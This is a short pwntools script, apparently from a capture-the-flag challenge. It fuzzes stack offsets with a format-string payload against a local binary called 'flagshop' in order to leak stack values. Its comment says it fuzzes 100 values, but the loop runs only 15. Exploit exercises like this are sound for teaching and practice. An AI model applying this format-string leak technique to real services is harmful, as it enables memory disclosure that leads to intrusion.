from pwn import *
import os

# This will automatically get context arch, bits, os etc
elf = context.binary = ELF('./flagshop', checksec=False)

# Let's fuzz 100 values
for i in range(1,16):
    try:
        p = process(level='error')
        p.sendline(b'a')
        payload = 'XXXXXXXXXXXXXXXXX%{}$p%{}$p'.format(i,i+1).encode().ljust(34, b'A')
        info(payload)
        p.sendline(payload)
        p.recvuntil(b'\x1b[1;1H\x1b[2J')
        p.sendline(b'1')
        p.recvuntil(b'\x1b[1;1H\x1b[2J')
        p.recvuntil(b'Here\'s your flag current user: ')
        result = p.recvline()
        print(str(i) + ': ' + str(result))
        p.close()
    except ValueError:
        pass
